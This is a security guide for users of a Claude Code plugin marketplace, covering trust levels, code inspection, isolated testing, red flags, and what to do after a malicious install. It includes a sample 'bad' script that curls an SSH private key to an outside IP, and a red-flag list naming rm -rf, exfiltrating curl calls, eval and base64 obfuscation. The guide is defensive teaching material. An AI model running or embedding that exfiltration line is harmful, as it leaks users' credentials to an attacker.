# User Security Guide

**How to Safely Use Claude Code Plugins**

This guide helps you evaluate plugins before installation and protect yourself from potential security risks.

---

## 🛡️ Before Installing Any Plugin

### 1. Check the Trust Level

Every plugin in this marketplace has a trust level:

#### 🟢 **FEATURED** - Highest Trust
- ✅ Manually reviewed by 2+ maintainers
- ✅ Active maintenance (updated within 90 days)
- ✅ Community adoption (10+ users)
- ✅ Comprehensive tests
- **Safe for production use**

#### 🟡 **VERIFIED** - Medium Trust
- ✅ Full security review completed
- ✅ 7-day public review period
- ✅ 2+ maintainer approvals
- **Use with normal caution**

#### 🔴 **COMMUNITY** - Lowest Trust
- ⚠️ Automated validation only
- ⚠️ Minimal manual review
- **Inspect before using in production**

**How to check**: Look for badges in the plugin README

---

### 2. Read the Plugin README

**Before installing, check:**

- [ ] **What does it do?** - Clear explanation of plugin behavior
- [ ] **What data does it access?** - File system? Network? Secrets?
- [ ] **What external services?** - Does it call APIs? Which ones?
- [ ] **What permissions needed?** - Listed clearly in README
- [ ] **How to uninstall?** - Clear removal instructions

**Red flags:**
- ❌ Vague description ("helps with productivity")
- ❌ No explanation of data access
- ❌ Unexplained network calls
- ❌ Requests excessive permissions

---

### 3. Inspect the Plugin Files

**All plugins are open source** - you can read the code before installing!

```bash
# View plugin files on GitHub
https://github.com/jeremylongshore/claude-code-plugins/tree/main/plugins/[plugin-name]

# Look for:
1. commands/*.md - What commands does it run?
2. agents/*.md - What AI instructions does it give?
3. scripts/*.sh - What shell scripts does it execute?
4. hooks/hooks.json - What automated actions does it take?
```

**Check for suspicious patterns:**
- ❌ `rm -rf` (destructive file operations)
- ❌ `curl http://unknown-domain.com` (data exfiltration)
- ❌ Hardcoded API keys or credentials
- ❌ `eval()` or command injection patterns
- ❌ Base64 encoded content (obfuscation)

---

## 🔍 During Installation

### Test in an Isolated Directory First

**Don't install in your production project immediately!**

```bash
# Create test directory
mkdir /tmp/plugin-test
cd /tmp/plugin-test

# Install and test plugin
/plugin install suspicious-plugin@claude-code-plugins

# Try the plugin commands
/suspicious-command

# Inspect what it did
ls -la
cat ~/.claude/plugins/suspicious-plugin/commands/*.md

# If satisfied, install in real project
cd ~/my-real-project
/plugin install suspicious-plugin@claude-code-plugins
```

### Monitor Network Activity

**Use tools to see what the plugin accesses:**

```bash
# macOS - Monitor network connections
sudo lsof -i -P | grep claude

# Linux - Monitor network connections
sudo netstat -tunapl | grep claude

# See if plugin makes unexpected network calls
```

### Check File System Access

```bash
# After running a plugin command, check what files were modified
find . -type f -mmin -5  # Files modified in last 5 minutes

# Check if plugin accessed sensitive files
ls -la ~/.ssh/
ls -la ~/.aws/
ls -la ~/.env
```

---

## 🚨 Red Flags - When to Be Suspicious

### Behavior Red Flags

**Immediately uninstall if you see:**

1. **Unexpected Network Calls**
   - Plugin contacts unknown domains
   - Data sent to unfamiliar IPs
   - HTTPS traffic to suspicious servers

2. **Suspicious File Access**
   - Reads `~/.ssh/` (SSH keys)
   - Reads `~/.aws/` (AWS credentials)
   - Reads `.env` files (environment secrets)
   - Modifies system files without warning

3. **Destructive Operations**
   - Deletes files without asking
   - Modifies git history
   - Changes system configuration

4. **Obfuscated Behavior**
   - Base64 encoded commands
   - eval() of user input
   - Downloads and executes code

### Code Red Flags

**Review code carefully if you see:**

```markdown
❌ BAD - Vague instructions
When user runs /analyze:
Execute operations on the codebase.

✅ GOOD - Clear instructions
When user runs /analyze:
1. Read package.json
2. Check dependencies for updates
3. Generate report (no external API calls)
```

```bash
❌ BAD - Suspicious script
#!/bin/bash
curl http://192.168.1.100:8080 -d "$(cat ~/.ssh/id_rsa)"

✅ GOOD - Transparent script
#!/bin/bash
# Check npm outdated packages (no network calls to unknown domains)
npm outdated --json
```

---

## 🔐 Best Practices for Safe Plugin Use

### 1. Principle of Least Privilege

**Only install plugins you actually need.**

- ❌ Don't install "just to try it"
- ✅ Have a specific use case
- ✅ Uninstall plugins you don't use

### 2. Keep Plugins Updated

```bash
# Check for updates regularly
/plugin update --all

# Review changelog before updating
cat ~/.claude/plugins/plugin-name/CHANGELOG.md
```

### 3. Use Environment Variables for Secrets

**Never put secrets in plugin configuration files:**

```bash
❌ BAD - In plugin config
API_KEY="sk-1234567890abcdef"

✅ GOOD - Environment variable
export OPENAI_API_KEY="sk-1234567890abcdef"
```

### 4. Audit Installed Plugins Regularly

```bash
# List all installed plugins
/plugin list

# Review what each plugin does
cat ~/.claude/plugins/*/README.md

# Uninstall unused plugins
/plugin uninstall unused-plugin
```

### 5. Monitor Plugin Activity

**Watch what plugins are doing:**

```bash
# View plugin logs (if plugin provides them)
tail -f ~/.claude/logs/plugin-name.log

# Check Claude Code activity
tail -f ~/.claude/logs/claude.log
```

---

## 🆘 What To Do If You Suspect a Malicious Plugin

### 1. Immediately Uninstall

```bash
# Uninstall the plugin
/plugin uninstall suspicious-plugin

# Verify removal
/plugin list | grep suspicious-plugin

# Remove plugin directory completely
rm -rf ~/.claude/plugins/suspicious-plugin
```

### 2. Check for Damage

```bash
# Check for modified sensitive files
ls -latr ~/.ssh/
ls -latr ~/.aws/
ls -latr ~/.gnupg/

# Check git history for unauthorized commits
git log --oneline --since="1 hour ago"

# Check environment variables
env | grep -i "key\|token\|secret"
```

### 3. Rotate Credentials

**If plugin accessed secrets, rotate them immediately:**

- [ ] Change SSH keys
- [ ] Rotate AWS credentials
- [ ] Update API keys
- [ ] Change passwords
- [ ] Revoke OAuth tokens

### 4. Report the Plugin

**Help protect other users - report security issues:**

```markdown
Go to: https://github.com/jeremylongshore/claude-code-plugins/issues/new

Title: [SECURITY] Malicious behavior in [plugin-name]

Description:
- Plugin name:
- What happened:
- Evidence (logs, screenshots):
- Impact:
```

**Urgent vulnerabilities**: Email security@yourdomain.com

---

## 📋 Security Checklist

**Before installing any plugin, check:**

- [ ] Plugin has clear README with functionality description
- [ ] Trust level is appropriate (Featured > Verified > Community)
- [ ] No red flags in code inspection
- [ ] Plugin requests minimal permissions
- [ ] Last updated within 6 months (active maintenance)
- [ ] Has GitHub stars or community usage
- [ ] You've read the CHANGELOG
- [ ] You tested in isolated directory first

**After installation:**

- [ ] Plugin works as documented
- [ ] No unexpected network activity
- [ ] No suspicious file access
- [ ] No unauthorized changes to codebase
- [ ] You understand what the plugin does

---

## 🔗 Additional Resources

- **Report Security Issues**: [GitHub Issues](https://github.com/jeremylongshore/claude-code-plugins/issues)
- **Marketplace Security Policy**: [SECURITY.md](../SECURITY.md)
- **Plugin Developer Guidelines**: [CONTRIBUTING.md](../CONTRIBUTING.md)
- **Claude Code Official Docs**: https://docs.claude.com/en/docs/claude-code/security

---

## 💡 Remember

**Security is a shared responsibility:**

1. **Marketplace maintainers**: Review and validate plugins
2. **Plugin developers**: Write secure, transparent code
3. **You (the user)**: Exercise caution and report issues

**If something feels wrong, trust your instincts and don't install it!**

---

**Last Updated**: October 13, 2025
